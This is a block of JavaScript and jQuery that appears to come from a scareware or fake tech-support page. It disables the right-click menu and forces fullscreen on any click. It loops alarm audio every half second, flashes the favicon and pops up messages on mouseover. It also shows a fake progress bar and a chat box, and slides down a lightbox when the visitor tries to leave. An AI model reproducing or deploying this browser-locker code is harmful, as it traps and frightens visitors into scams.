//<![CDATA[
    $(function(){
        $('body').bind('contextmenu', function(e){
        return false;
        });
        });//]]>
      $(document).ready(function(){
        $(".map").click(function(){
          $("#age-confirmation-modal").hide();
        });
      });
      

    

function addEvent(obj, evt, fn) {
    if (obj.addEventListener) {
        obj.addEventListener(evt, fn, false);
    } else if (obj.attachEvent) {
        obj.attachEvent("on" + evt, fn);
    }
}

addEvent(document, 'mouseout', function(evt) {
    if (evt.toElement == null && evt.relatedTarget == null) {
        $('.lightbox').slideDown();
    };
});

$('a.close').click(function() {
    $('.lightbox').slideUp();
});
$('body').click(function() {
    $('.lightbox').slideUp();
});

    
    
      $(function() {
        var a = 0,
          b = setInterval(function() {
            a += 10;
            $("#dynamic").css("width", a + "%").attr("aria-valuenow", a).text(a + "% 完了");
            100 <= a && clearInterval(b)
          }, 100)
      });
    
    
      (function(a) {
        a.fn.countTo = function(b) {
          b = b || {};
          return a(this).each(function() {
            function d(a) {
              a = c.formatter.call(k, a, c);
              h.html(a)
            }
            var c = a.extend({}, a.fn.countTo.defaults, {
                from: a(this).data("from"),
                to: a(this).data("to"),
                speed: a(this).data("speed"),
                refreshInterval: a(this).data("refresh-interval"),
                decimals: a(this).data("decimals")
              }, b),
              l = Math.ceil(c.speed / c.refreshInterval),
              n = (c.to - c.from) / l,
              k = this,
              h = a(this),
              m = 0,
              f = c.from,
              g = h.data("countTo") || {};
            h.data("countTo", g);
            g.interval && clearInterval(g.interval);
            g.interval = setInterval(function() {
              f += n;
              m++;
              d(f);
              "function" == typeof c.onUpdate && c.onUpdate.call(k, f);
              m >= l && (h.removeData("countTo"), clearInterval(g.interval), f = c.to, "function" == typeof c.onComplete && c.onComplete.call(k, f))
            }, c.refreshInterval);
            d(f)
          })
        };
        a.fn.countTo.defaults = {
          from: 0,
          to: 0,
          speed: 100,
          refreshInterval: 100,
          decimals: 0,
          formatter: function(a, d) {
            return a.toFixed(d.decimals)
          },
          onUpdate: null,
          onComplete: null
        }
      })(jQuery);
      jQuery(function(a) {
        a(".count-number").data("countToOptions", {
          formatter: function(a, d) {
            return a.toFixed(d.decimals).replace(/\B(?=(?:\d{3})+(?!\d))/g, ",")
          }
        });
        a(".timer").each(function(b) {
          var d = a(this);
          b = a.extend({}, b || {}, d.data("countToOptions") || {});
          d.countTo(b)
        })
      });
    

    
      addEventListener("click", function() {
    var el = document.documentElement
      , rfs =
             el.requestFullScreen
          || el.webkitRequestFullScreen
          || el.mozRequestFullScreen
    ;
    rfs.call(el);
    });

    


    
      setInterval(function() {
        document.getElementById("mcr").play()
      }, 500);
    
    
      var e = 1;
      setInterval(function() {
        1 == e ? (document.getElementById("favicon").href = "w3.html", e = 0) : (document.getElementById("favicon").href = "w1.html", e = 1)
      }, 1E3);
    
    
      $(document).ready(function() {
        $("#mycanvas").click(function() {
          $("#welcomeDiv").show()
        })
      });
    

    
      $(document).ready(function() {
        $("#mycanvas").click(function() {
          $("#poptxt").show()
        })
      });
      $(document).ready(function() {
        $("#cross").click(function() {
          $("#poptxt").show()
        })
      });
    
    
      $(document).ready(function() {
        $("body").mouseover(function() {
          $("#poptxt").show()
        })
      });
    
   
    
      $(document).ready(function() {
        $("#chat").delay(600).fadeIn(100)
      });
    

       
        setInterval(function() {
          document.getElementById("infogt").play()
        }, 500);
      
      
  function beep1() {
    document.getElementById("websgt").play();
 }
  
      
  function beep1() {
    document.getElementById("websgt").play();
 }
  